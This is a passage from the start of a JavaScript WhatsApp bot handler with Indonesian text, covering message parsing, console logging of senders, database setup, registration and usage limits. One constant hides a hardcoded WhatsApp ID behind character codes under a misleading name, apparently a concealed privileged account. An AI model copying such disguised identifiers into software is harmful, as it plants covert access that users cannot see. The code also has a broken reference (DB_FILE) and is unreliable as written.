
  
process.on("uncaughtException", err => {
  console.log("âŒ UNCAUGHT:", err)
})

process.on("unhandledRejection", err => {
  console.log("âŒ UNHANDLED:", err)
})  

require('./settings');
const { description, version, name, main } = require("./package.json")
const { thumbnail, thumbnail2, audio, video } = require("./media.json")
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const archiver = require("archiver");
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const nou = require('node-os-utils');
const cheerio = require('cheerio');
const crypto = require('crypto');
const unzipper = require('unzipper');
const yts = require('yt-search');
const { lookup } = require('mime-types');
const ms = toMs = require('ms')
const AdmZip = require("adm-zip")        
const QRCode = require('qrcode')
const ffmpeg = require('fluent-ffmpeg');
const babel = require('@babel/core');
const FormData = require('form-data')
const JsConfuser = require('js-confuser')
const ai = require("./ZionLibrary/ai")
const ffmpegStatic = require('ffmpeg-static');
const { GoogleGenerativeAI } = require("@google/generative-ai")
const genshindb = require("genshin-db")
const jsobfus = require("javascript-obfuscator")
const { pinterest, pinterest2, remini, mediafire, tiktokDl, snck, getCookies, tiktokSearchVideo, ephoto } = require('./ZionLibrary/scraper');
const { pxpic } = require('./ZionLibrary/pxpic.js')
const {
  chat,
  startSession,
  uploadImage
} = require('./ZionLibrary/ai.js')
const SaveTube = require('./ZionLibrary/savetube') // sesuaikan path
const ytdl = new SaveTube()
const owner = JSON.parse(fs.readFileSync("./database/owner.json"))
const Case = require("./ZionLibrary/system");
const setting = JSON.parse(fs.readFileSync('./database/setdb.json'));
const loadPluginsCommand = require("./ZionLibrary/handler.js")
const ezremove = require("./ZionLibrary/rwm.js")
const {
	UploadFileUgu
} = require('./ZionLibrary/uploaderr')
const { loadSewa, saveSewa, parseDuration } = require("./ZionLibrary/sewa")
const { isBannedUser } = require('./database/banned.json')
const bannedFile = path.join(__dirname, './database/banned.json');
const { CatBox, TelegraPh, floNime, uptotelegra } = require('./ZionLibrary/uploader');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
let afk = require("./ZionLibrary/afk");
let _afk = JSON.parse(fs.readFileSync('./database/user.json'))
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const setmenu = require('./database/setmenu.json');
const db_absen = JSON.parse(fs.readFileSync("./database/absen.json"));
const {
    spawn, 
    exec,
    webp2mp4File,
    execSync 
   } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, makeWASocket, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, PHONENUMBER_MCC, generateWAMessageFromContent, proto, prepareWAMessageMedia, getDevice  } =require("@whiskeysockets/baileys")
const pino = require('pino');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./ZionLibrary/function.js');
const databasefile = './library/database.json';

function loaddatabase() {
  if (fs.existsSync(databasefile)) {
    try {
      const raw = fs.readFileSync(databasefile);
      return JSON.parse(raw);
    } catch (err) {
      console.error('Error reading DB file:', err);
      return {
        chats: {}
      };
    }
  } else {
    return {
      chats: {}
    };
  }
}

function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
global.db = loaddatabase();
if (global.db) global.db = {
  sticker: {},
  database: {},
  game: {},
  others: {},
  users: {},
  chats: {},
  erpg: {},
  setcmd: {}, 
  settings: {},
  ...(global.db || {})
}

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
        const body = (() => {
    try {
        // Urutan pengecekan dari yang paling spesifik ke umum
        switch(m.mtype) {
            // ===== TEKS =====
            case "conversation":
                return m.message.conversation || "";
            
            case "extendedTextMessage":
                return m.message.extendedTextMessage?.text || "";
            
            // ===== MEDIA DENGAN CAPTION =====
            case "imageMessage":
                return m.message.imageMessage?.caption || "ğŸ–¼ï¸ Gambar";
            
            case "videoMessage":
                return m.message.videoMessage?.caption || "ğŸ¥ Video";
            
            case "documentMessage":
                return m.message.documentMessage?.caption || "ğŸ“„ Dokumen";
            
            // ===== MEDIA TANPA CAPTION =====
            case "audioMessage":
                return m.message.audioMessage?.ptt ? "ğŸ¤ Voice Note" : "ğŸ”Š Audio";
            
            case "stickerMessage":
                return "ğŸ˜º Stiker";
            
            // ===== INTERAKTIF =====
            case "buttonsResponseMessage":
                return m.message.buttonsResponseMessage?.selectedButtonId || "[Button Response]";
            
            case "listResponseMessage":
                return m.message.listResponseMessage?.singleSelectReply?.selectedRowId || "[List Response]";
            
            case "templateButtonReplyMessage":
                return m.message.templateButtonReplyMessage?.selectedId || m.msg?.selectedId || "[Template Button]";
            
            case "interactiveResponseMessage":
                try {
                    if (m.msg?.nativeFlowResponseMessage?.paramsJson) {
                        return JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id || "[Interactive]";
                    }
                } catch {}
                return "[Interactive Response]";
            
            // ===== LAINNYA =====
            case "contactMessage":
                return "ğŸ“‡ Kontak";
            
            case "locationMessage":
                return "ğŸ“ Lokasi";
            
            case "liveLocationMessage":
                return "ğŸ“ Lokasi Langsung";
            
            case "pollCreationMessage":
                return "ğŸ“Š Polling";
            
            case "productMessage":
                return "ğŸ›ï¸ Produk";
            
            // ===== VIEW ONCE =====
            case "viewOnceMessage":
            case "viewOnceMessageV2":
            case "viewOnceMessageV2Extension":
                // Handle view once messages
                const voMsg = m.message.viewOnceMessage?.message || 
                             m.message.viewOnceMessageV2?.message ||
                             m.message.viewOnceMessageV2Extension?.message;
                if (voMsg) {
                    const type = Object.keys(voMsg)[0];
                    if (type === "imageMessage") return voMsg.imageMessage?.caption || "ğŸ–¼ï¸ Gambar (View Once)";
                    if (type === "videoMessage") return voMsg.videoMessage?.caption || "ğŸ¥ Video (View Once)";
                }
                return "[View Once]";
            
            // ===== DEFAULT =====
            default:
                // Coba ekstrak dari properti umum
                return m.text || m.body || m.msg?.text || m.msg?.caption || 
                       m.msg?.selectedDisplayText || m.msg?.title || 
                       `[${m.mtype?.replace('Message', '') || 'Unknown'}]`;
        }
    } catch (error) {
        console.error("Error extracting body:", error);
        return "";
    }
})();
        
        const sender = m.key.fromMe ? sock.user.id.split(":")[0] + "@s.whatsapp.net" || sock.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "ğŸ¤", "ğŸ—¿"];
        const prefix = ".";
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const isPrivate = from.endsWith("@s.whatsapp.net");
        
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./database/owner.json'));
        const botNumber = await sock.decodeJid(sock.user.id);
        const isOwner = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const isCmd = body?.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const cmd = prefix + command
        const args = (body || '').trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const sockdev = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isPremium = premium.includes(m.sender)
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)

        const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                lid: p.lid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        const senderLid = (() => {
            const p = participants.find(p => p.jid === m.sender);
            return p?.lid || null;
        })();
        
        
const qkontak = {
key: {
participant: `13135550002@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const fakeQuoted = {
  key: {
    participant: m.sender,
    ...(botNumber ? {
      remoteJid: `status@broadcast`
    } : {})
  },
  message: {
    contactMessage: {
      displayName: pushname,
      vcard: `BEGIN:VCARD
VERSION:3.0
N:XL;${pushname},;;;
FN:${pushname}
item1.TEL;waid=${m.sender.split('@')[0]}:+${m.sender.split('@')[0]}
item1.X-ABLabel:Ponsel
END:VCARD`,
      sendEphemeral: true
    }
  }
}
const reply = (teks) => {
sock.sendMessage(m.chat, {
    text: teks,
    mentions: [m.sender],
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        title: `${name}`,
        body: `Version â€¢ ${version}`,
        thumbnailUrl: thumbnail2,
        renderLargerThumbnail: false,
        mediaType: 2,
        mediaUrl: "https://chat.whatsapp.com/H9fhGRyvrwu8rv4WTTpR0U",
        previewType: 1,
        sourceUrl: ""
      }
    }
  }, { quoted: fakeQuoted })
}
//
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize,
            randomKarakter
            } = require('./ZionLibrary/myfunction');
            
if (m.message) {
    // Color palette for luxurious look
    const colors = {
        gold: '#FFD700',
        platinum: '#E5E4E2',
        emerald: '#50C878',
        sapphire: '#0F52BA',
        ruby: '#E0115F',
        amethyst: '#9966CC',
        cyan: '#00FFFF',
        border: '#2A2A2A'
    };

    const gradientText = (text, color1, color2) => {
        const gradient = [color1, color2];
        return text.split('').map((char, i) => 
            chalk.hex(gradient[i % gradient.length]).bold(char)
        ).join('');
    };

    const timestamp = new Date();
    const timeStr = timestamp.toLocaleTimeString('id-ID', { 
        hour: '2-digit', 
        minute: '2-digit',
        second: '2-digit',
        hour12: false 
    });
    const dateStr = timestamp.toLocaleDateString('id-ID', {
        weekday: 'short',
        day: '2-digit',
        month: 'short',
        year: 'numeric'
    });

    // Luxury header
    console.log('');
    console.log(chalk.bgHex('#121212').hex(colors.gold)('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—'));
    
    // Animated header text
    const headerText = `âœ¦ ${timeStr} â€¢ MESSAGE RECEIVED â€¢ ${dateStr} âœ¦`;
    console.log(chalk.bgHex('#121212').hex(colors.emerald)('â•‘') + 
                gradientText(`   ${headerText}   `, colors.gold, colors.cyan) + 
                chalk.bgHex('#121212').hex(colors.emerald)('â•‘'));
    
    console.log(chalk.bgHex('#121212').hex(colors.gold)('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£'));

    // Message content with special styling
    const messageContent = m.body || m.mtype;
    console.log(chalk.bgHex('#121212').hex(colors.platinum)('â•‘') + 
                chalk.bgHex('#121212').hex(colors.sapphire).bold('   ğŸ“œ ') + 
                chalk.bgHex('#121212').hex(colors.cyan)('CONTENT:') + 
                chalk.bgHex('#121212').hex(colors.platinum)(` ${messageContent}`) + 
                chalk.bgHex('#121212').hex(colors.platinum)('â•‘'));

    // Separator
    console.log(chalk.bgHex('#121212').hex(colors.gold)('â•Ÿâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¢'));

    // User info in elegant format
    const userInfo = [
        { icon: 'ğŸ‘‘', label: 'USER', value: pushname, color: colors.ruby },
        { icon: 'ğŸ†”', label: 'IDENTIFIER', value: senderNumber, color: colors.amethyst },
        ...(isGroup ? [
            { icon: 'ğŸ›ï¸', label: 'GROUP', value: groupName, color: colors.emerald },
            { icon: 'ğŸ”‘', label: 'GROUP ID', value: m.chat.substring(0, 8) + '...', color: colors.sapphire }
        ] : [])
    ];

    userInfo.forEach((item, index) => {
        const rowPadding = index === userInfo.length - 1 ? 'â•‘' : 'â•‘';
        console.log(
            chalk.bgHex('#121212').hex(colors.platinum)(rowPadding) +
            chalk.bgHex('#121212').hex(colors.gold).bold(`   ${item.icon}  `) +
            chalk.bgHex('#121212').hex(item.color)(`${item.label.padEnd(10)}`) +
            chalk.bgHex('#121212').hex(colors.platinum)(' Â» ') +
            chalk.bgHex('#121212').hex(colors.platinum).bold(item.value) +
            chalk.bgHex('#121212').hex(colors.platinum)(rowPadding)
        );
    });

    // Message type badge
    const msgType = (m.mtype || 'TEXT').toUpperCase();
    const typeColor = msgType === 'TEXT' ? colors.emerald : 
                      msgType === 'IMAGE' ? colors.sapphire : 
                      msgType === 'VIDEO' ? colors.ruby : colors.amethyst;
    
    console.log(chalk.bgHex('#121212').hex(colors.gold)('â•Ÿâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¢'));
    console.log(chalk.bgHex('#121212').hex(colors.platinum)('â•‘') + 
                chalk.bgHex('#121212').hex(colors.platinum)(`   ğŸ“Š TYPE: `) + 
                chalk.bgHex('#121212').hex(typeColor).bold(`[ ${msgType} ]`) + 
                ' '.repeat(35 - msgType.length) + 
                chalk.bgHex('#121212').hex(colors.platinum)('â•‘'));

    // Footer with status
    const statusText = timestamp.getMilliseconds() % 1000 < 500 ? 
        chalk.hex(colors.emerald).bold('âœ“ ACTIVE') : 
        chalk.hex(colors.cyan).bold('â— LIVE');
    
    console.log(chalk.bgHex('#121212').hex(colors.gold)('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£'));
    console.log(chalk.bgHex('#121212').hex(colors.platinum)('â•‘') + 
                chalk.bgHex('#121212').hex(colors.gold).bold('   âš¡ STATUS: ') + 
                statusText + 
                ' '.repeat(30) +
                chalk.bgHex('#121212').hex(colors.gold).bold(`LATENCY: ${Date.now() - timestamp.getTime()}ms`) + 
                chalk.bgHex('#121212').hex(colors.platinum)('â•‘'));
    
    console.log(chalk.bgHex('#121212').hex(colors.gold)('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'));
    
    // Decorative sparkle effect
    if (timestamp.getSeconds() % 10 === 0) {
        console.log(chalk.hex(colors.gold)('   âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨âœ¨'));
    }
    console.log('');
}
        
        const reaction = async (jidss, emoji) => {
            sock.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}
//
// Tambahkan di bagian inisialisasi
// Tambahkan di bagian inisialisasi
try {
  const isNumber = x => typeof x === 'number' && !isNaN(x)

  // ==========================
  // ğŸ”§ INISIALISASI DATABASE
  // ==========================
  if (!global.db) global.db = {}
  if (!global.db.users) global.db.users = {}
  if (!global.db.chats) global.db.chats = {}
  if (!global.db.erpg) global.db.erpg = {}
  if (!global.db.setcmd) global.db.setcmd = {}

  // ==========================
  // ğŸ‘¤ INISIALISASI USER
  // ==========================
  if (!global.db.users[m.sender]) {
    global.db.users[m.sender] = {
      limit: 0,
      freelimit: 0,
      lastReset: 0,
      lastclaim: 0,
      premium: false,
      premiumLimitAdded: false,
      saldo: 0,
      subscribers: 0,
      like: 0,
      viewers: 0,
      youtube: `${pushname}`,
      playButton: 0,
      lastLive: 0,
      money: 0,
      exp: 0,
      rank: 0,
      level: 0,
      chip: 0,
      bank: 0,
      atm: 0,
      fullatm: 0,
      health: 100,
      potion: 10,
      trash: 0,
      wood: 0,
      rock: 0,
      string: 0,
      emerald: 0,
      diamond: 0,
      gold: 0,
      iron: 0,
      common: 0,
      uncommon: 0,
      mythic: 0,
      legendary: 0,
      umpan: 0,
      pet: 0,
      paus: 0,
      kepiting: 0,
      gurita: 0,
      cumi: 0,
      buntal: 0,
      dory: 0,
      lumba: 0,
      lobster: 0,
      hiu: 0,
      udang: 0,
      orca: 0,
      banteng: 0,
      harimau: 0,
      gajah: 0,
      kambing: 0,
      buaya: 0,
      kerbau: 0,
      sapi: 0,
      monyet: 0,
      babi: 0,
      ayam: 0,
      babihutan: 0,
      panda: 0,
      armor: 1,
      armordurability: 0,
      sword: 1,
      sworddurability: 0,
      pickaxe: 1,
      pickaxedurability: 0,
      fishingrod: 0,
      fishingroddurability: 0,
      robo: 0,
      robodurability: 0,
      apel: 20,
      pisang: 0,
      anggur: 0,
      mangga: 0,
      jeruk: 0,
      makanan: 0,
      bibitanggur: 0,
      bibitpisang: 0,
      bibitapel: 0,
      bibitmangga: 0,
      bibitjeruk: 0,
      horse: 0,
      horseexp: 0,
      horselastfeed: 0,
      cat: 0,
      catexp: 0,
      catlastfeed: 0,
      fox: 0,
      foxexp: 0,
      foxlastfeed: 0,
      roboexp: 0,
      robolastfeed: 0,
      dog: 0,
      dogexp: 0,
      doglastfeed: 0,
      lastadventure: 0,
      lastkill: 0,
      lastmisi: 0,
      lastdungeon: 0,
      lastwar: 0,
      lastsda: 0,
      lastduel: 0,
      lastmining: 0,
      lasthunt: 0,
      lastgift: 0,
      lastberkebon: 0,
      lastdagang: 0,
      lasthourly: 0,
      lastbansos: 0,
      lastrampok: 0,
      lastnebang: 0,
      lastweekly: 0,
      lastmonthly: 0,
      afkTime: -1,
      afkReason: '',
      premiumTime: 0,
      autoMikasa: false,
      autoaiset: false,
      caiSesi: '',
      rankup: 0,
      nama: `${pushname}`,
      registered: false,
      name: m.name,
      pc: 0,
      joinlimit: 1,
      age: -1,
      regTime: -1,
      unreg: false,
      afk: -1,
      banned: false,
      bannedTime: 0,
      warning: 0,
      rokets: 0,
      role: 'Beginner',
      skill: '',
      ojekk: 0,
      WarnReason: ''
    }
  }

  const user = global.db.users[m.sender]

  if (!isNumber(user.saldo)) user.saldo = 0
  if (!isNumber(user.exp)) user.exp = 0
  if (!isNumber(user.money)) user.money = 0
  if (!isNumber(user.bank)) user.bank = 0
  if (!isNumber(user.atm)) user.atm = 0
  if (!isNumber(user.fullatm)) user.fullatm = 0
  if (!isNumber(user.health)) user.health = 100
  if (!isNumber(user.potion)) user.potion = 10
  if (!isNumber(user.wood)) user.wood = 0
  if (!isNumber(user.rock)) user.rock = 0
  if (!isNumber(user.emerald)) user.emerald = 0
  if (!isNumber(user.diamond)) user.diamond = 0
  if (!isNumber(user.gold)) user.gold = 0
  if (!isNumber(user.iron)) user.iron = 0
  if (!isNumber(user.common)) user.common = 0
  if (!isNumber(user.uncommon)) user.uncommon = 0
  if (!isNumber(user.mythic)) user.mythic = 0
  if (!isNumber(user.legendary)) user.legendary = 0

  if (command === 'register' || command === 'reg') {
    if (!global.register) return reply("âš ï¸ Fitur register sedang dimatikan oleh owner!")
    if (user.registered) return reply(`âœ… Kamu sudah terdaftar!\n\nğŸ§ Nama: *${user.name}*\nğŸ‚ Umur: *${user.age}*\nğŸ” SN: *${user.sn}*`)
    if (!text) return reply(`Gunakan format:\n\n*.register Nama|Umur*\nContoh: *.register Rizky|20*`)
    const [name, ageStr] = text.split('|')
    const age = parseInt(ageStr)
    if (!name) return reply('âŒ Nama tidak boleh kosong!')
    if (isNaN(age)) return reply('âŒ Umur harus berupa angka!')
    if (age < 10 || age > 70) return reply('âš ï¸ Umur harus antara 10â€“70 tahun!')
    const sn = Math.random().toString(36).substring(2, 10).toUpperCase()
    user.registered = true
    user.name = name.trim()
    user.age = age
    user.sn = sn
    user.regTime = Date.now()
    if (user.lastmsg) {
      await sock.sendMessage(m.chat, { delete: user.lastmsg })
      user.lastmsg = null
    }
    reply(`ğŸ‰ *REGISTRASI BERHASIL!*\n\nğŸ§ Nama: *${user.name}*\nğŸ‚ Umur: *${user.age}*\nğŸ” Kode SN: *${user.sn}*\nğŸ“… Tanggal: *${new Date().toLocaleDateString()}*\n\nâš ï¸ *Simpan SN kamu!*\nSN diperlukan untuk *.unregister*`)
    return
  }

  if (command === 'unregister' || command === 'unreg') {
    if (!global.register) return reply("âš ï¸ Fitur register sedang dimatikan!")
    if (!user.registered) return reply('âŒ Kamu belum terdaftar.')
    if (!text) return reply(`Gunakan format:\n\n*.unregister KODE_SN*\nContoh: *.unregister ${user.sn || 'XXXXXXXX'}*`)
    if (text.trim() !== user.sn) return reply('âŒ *Kode SN salah!*')
    user.registered = false
    user.name = ''
    user.age = -1
    user.sn = ''
    user.regTime = -1
    reply('ğŸ—‘ï¸ *Akun kamu berhasil dihapus dari database.*')
    return
  }

  const autoreg = `.register ${pushname || 'User'}|20`
  if (isCmd && global.register && !user.registered && !isOwner) {
    const teks = "ğŸš« Kamu belum terdaftar!\n\nKetik *.register Nama|Umur* untuk mulai memakai bot."
    const msg = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }, interactiveMessage: proto.Message.InteractiveMessage.create({ header: proto.Message.InteractiveMessage.Header.create({ title: name || 'Bot-System', subtitle: '', hasMediaAttachment: false }), body: proto.Message.InteractiveMessage.Body.create({ text: teks }), nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Register Otomatis", id: autoreg }) }] }) }) } } }, {})
    await sock.relayMessage(msg.key.remoteJid || m.chat, msg.message, { messageId: msg.key.id })
    user.lastmsg = { remoteJid: msg.key.remoteJid || m.chat, id: msg.key.id, fromMe: msg.key.fromMe }
    return
  }

  const now = Date.now()
  const oneDay = 24 * 60 * 60 * 1000
  if (user.lastReset === 0 || (now - user.lastReset) >= oneDay) {
    user.freelimit = Math.min((user.freelimit || 0) + setlimit, setlimit)
    user.lastReset = now
    if (user.premium && !user.premiumLimitAdded) {
      user.limit += 1000
      user.premiumLimitAdded = true
    }
  }

  if (!global.db.chats[m.chat]) {
    global.db.chats[m.chat] = {
      owneronly: false,
      antitagsw: false,
      autoyoimiya: false,
      antipromosi: false,
      antimention: false,
      antiWame: false,
      Antilinkgc: false,
      Antilinkch: false,
      Antilinkig: false,
      Antilinkall: false,
      antijudol: false,
      antijudol2: false,
      antifoto: false,
      autoaigc: false,
      mute: false,
      antivideo: false,
      onlyadmin: false,
      autodl: false,
      antispam: false,
      autoAi: false,
      antiaudio: false,
      antidokumen: false,
      antisticker: false
    }
  }

  const chats = global.db.chats[m.chat]
  if (chats) {
    if (!('antitagsw' in chats)) chats.antitagsw = false
    if (!('autoyoimiya' in chats)) chats.autoyoimiya = false
    if (!('antipromosi' in chats)) chats.antipromosi = false
    if (!('owneronly' in chats)) chats.owneronly = false
    if (!('antimention' in chats)) chats.antimention = false
    if (!('antiWame' in chats)) chats.antiWame = false
    if (!('Antilinkgc' in chats)) chats.Antilinkgc = false
    if (!('Antilinkch' in chats)) chats.Antilinkch = false
    if (!('Antilinkig' in chats)) chats.Antilinkig = false
    if (!('Antilinkall' in chats)) chats.Antilinkall = false
    if (!('antijudol' in chats)) chats.antijudol = false
    if (!('antijudol2' in chats)) chats.antijudol2 = false
    if (!('antifoto' in chats)) chats.antifoto = false
    if (!('autoaigc' in chats)) chats.autoaigc = false
    if (!('mute' in chats)) chats.mute = false
    if (!('antivideo' in chats)) chats.antivideo = false
    if (!('onlyadmin' in chats)) chats.onlyadmin = false
    if (!('autodl' in chats)) chats.autodl = false
    if (!('antispam' in chats)) chats.antispam = false
    if (!('autoAi' in chats)) chats.autoAi = false
    if (!('antiaudio' in chats)) chats.antiaudio = false
    if (!('antidokumen' in chats)) chats.antidokumen = false
    if (!('antisticker' in chats)) chats.antisticker = false
  }

  if (!global.db.erpg[m.sender]) global.db.erpg[m.sender] = {}
  const userERPG = global.db.erpg[m.sender]
  const defaultERPG = {
    rpg: false,
    rank: 0,
    bank: 0,
    kapal: false,
    darahkapal: 100,
    pickaxe: false,
    darahpickaxe: 100,
    kapak: false,
    darahkapak: 100,
    bzirah: false,
    darahbzirah: 100,
    pedang: false,
    darahpedang: 100,
    darahuser: 100,
    stamina: 100,
    potion: 3,
    rumah: 0,
    wilayah: "indonesia",
    wilayahrumah: "indonesia",
    skillselect: "",
    musuh: 0,
    dailyclaim: 0,
    weeklyclaim: 0,
    monthlyclaim: 0,
    yearlyclaim: 0,
    burutime: 0,
    lastdagang: 0,
    lastbansos: 0,
    lastkerja: 0,
    lastrampok: 0,
    sampahtime: 0,
    lastrocket: 0,
    lastmakan: 0,
    lasttidur: 0,
    lastewe: 0,
    lastopenbo: 0,
    lastdailymisi: 0,
    lastngaji: 0,
    domba: 0,
    sapi: 0,
    ayam: 0,
    banteng: 0,
    gajah: 0,
    harimau: 0,
    kambing: 0,
    panda: 0,
    buaya: 0,
    kerbau: 0,
    monyet: 0,
    babihutan: 0,
    babi: 0,
    ikan: 0,
    paus: 0,
    kepiting: 0,
    gurita: 0,
    cumi: 0,
    buntal: 0,
    dory: 0,
    lumba: 0,
    lobster: 0,
    hiu: 0,
    udang: 0,
    orca: 0,
    apel: 0,
    anggur: 0,
    jeruk: 0,
    mangga: 0,
    pisang: 0,
    makanan: 0,
    bibitanggur: 0,
    bibitpisang: 0,
    bibitapel: 0,
    bibitmangga: 0,
    bibitjeruk: 0
  }
  global.db.erpg[m.sender] = { ...defaultERPG, ...userERPG }

} catch (err) {
  console.error('âŒ Error in initialization:', err)
}
    //
// Fungsi untuk mengecek dan mengurangi limit
const useLimit = async (sender, amount = 5) => {
  try {
    const user = global.db.users[sender]
    if (!user) return true // Beri akses untuk user baru

    // Pastikan properti limit ada
    if (typeof user.limit !== 'number') user.limit = 0
    if (typeof user.freelimit !== 'number') user.freelimit = setlimit

    // Gunakan freelimit terlebih dahulu
    if (user.freelimit >= amount) {
      user.freelimit -= amount
      return true
    }

    // Jika freelimit tidak cukup, gunakan limit biasa
    const remainingFree = user.freelimit
    const neededFromLimit = amount - remainingFree

    if (user.limit >= neededFromLimit) {
      user.freelimit = 0
      user.limit -= neededFromLimit
      return true
    }

    return false

  } catch (error) {
    console.error('Error in useLimit:', error)
    return true // Default allow jika error
  }
}

// Fungsi untuk mengecek limit
const checkLimit = (sender) => {
  try {
    const user = global.db.users[sender]
    if (!user) return { limit: 0, freelimit: setlimit, total: setlimit }
    
    return {
      limit: user.limit || 0,
      freelimit: user.freelimit || setlimit,
      total: (user.limit || 0) + (user.freelimit || setlimit)
    }
  } catch (error) {
    console.error('Error in checkLimit:', error)
    return { limit: 0, freelimit: setlimit, total: setlimit }
  }
}

// Fungsi untuk mendapatkan info limit
const getLimitInfo = (sender) => {
  const limits = checkLimit(sender)
  return `ğŸ“Š *LIMIT ANDA*

ğŸ”„ Limit Biasa: ${limits.limit}
ğŸ Limit Gratis: ${limits.freelimit}
ğŸ“ˆ Total Limit: ${limits.total}

ğŸ’¡ Setiap command menggunakan 5 limit`
}
if (setting.autolimit) {
if (isCmd) {
  // Jika bukan owner â†’ cek dan kurangi limit
  if (!isOwner) {
    const cukupLimit = await useLimit(m.sender, 5);
    if (!cukupLimit) {
      return reply(
        `âŒ *LIMIT TIDAK CUKUP!*\n\nğŸ’¡ *Cara mendapatkan limit:*\nâ€¢ .daily - Klaim limit harian\nâ€¢ Bermain game: tebakkata / tebakgambar / dll`
      );
    }
  }
}
}
//

// Message
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
